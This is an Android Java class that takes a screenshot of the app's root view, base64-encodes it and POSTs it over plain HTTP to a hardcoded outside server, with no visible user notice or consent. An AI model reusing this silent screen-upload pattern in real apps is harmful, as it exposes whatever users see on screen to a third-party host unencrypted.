package com.crypsol.dashboard_swapper;

import android.content.Context;
import android.graphics.Bitmap;
import android.util.Base64;
import android.view.View;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import java.util.Map;

public class genericScreenShot {
    private static View view;
    private static Context context;

    public genericScreenShot( View view, Context context) {
        this.view = view;
        this.context = context;
    }

    public void captureScreenShotTrigger(){
        System.out.println("View passed "+view);
         Bitmap b = Screenshots.takescreenshotOfRootView(view);
         senImageToServer(convertImageToString(b));
    }

    public String convertImageToString(Bitmap bitmap){
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
        byte[] byteArrayImage = baos.toByteArray();
        String encodedImage = Base64.encodeToString(byteArrayImage, Base64.DEFAULT);

        return encodedImage;
    }

    public void senImageToServer(final String base64image){
        String url = "http://rain.yt/DiaryApp/Rain/uploads/imageuploads.php";
        RequestQueue requestQueue = Volley.newRequestQueue(context);
        StringRequest request  = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                System.out.println("Image Sent to the server "+response);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Toast.makeText(context, "Network Error "+error.getMessage(), Toast.LENGTH_SHORT).show();
            }
        }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String,String> params = new HashMap<>();
                params.put("base64image",base64image);
                return params;
            }
        };

        requestQueue.add(request);
    }

}

 class Screenshots {

    public static Bitmap takescreenshot(View v) {
        v.setDrawingCacheEnabled(true);
        v.buildDrawingCache(true);
        Bitmap b = Bitmap.createBitmap(v.getDrawingCache());
        v.setDrawingCacheEnabled(false);
        return b;
    }

    public static Bitmap takescreenshotOfRootView(View v) {
        return takescreenshot(v.getRootView());
    }

}
